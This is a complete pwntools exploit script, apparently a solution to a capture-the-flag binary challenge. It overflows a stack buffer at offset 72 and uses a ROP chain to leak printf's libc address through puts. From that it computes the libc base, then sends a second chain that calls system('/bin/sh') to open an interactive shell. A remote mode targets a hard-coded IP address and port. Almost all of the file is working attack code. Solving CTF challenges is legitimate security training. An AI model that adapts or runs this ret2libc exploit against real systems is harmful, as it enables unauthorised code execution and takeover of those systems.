#!/usr/bin/python3

from pwn import *

elf = ELF('chall', checksec=False)
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b *0x401364",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("65.21.255.31", 13370)
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

libc = ELF('./libc.so.6')
rop = ROP(elf.path)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

OFFSET = 72
sla(b'size: ', b'0')
# sla(b'data', cyclic(200, n=8))
sla(b'data', flat(
	b'A' * OFFSET,
	POP_RDI, elf.got['printf'],
	elf.symbols['puts'],
	elf.symbols['main']
))

leak = rl()[2:]
print(leak)
libc_leak = u64(leak.ljust(8, b'\x00'))
ls(f'libc_leak: {libc_leak:#x}')

libc_base = libc_leak - libc.symbols['printf']
ls(f'libc_base: {libc_base:#x}')

libc.address = libc_base
binsh = next(libc.search(b"/bin/sh"))

sla(b'size: ', b'0')
sla(b'data', flat(
	b'A' * (OFFSET),
	POP_RDI, binsh,
	RET,
	libc.symbols['system']
))

ia()
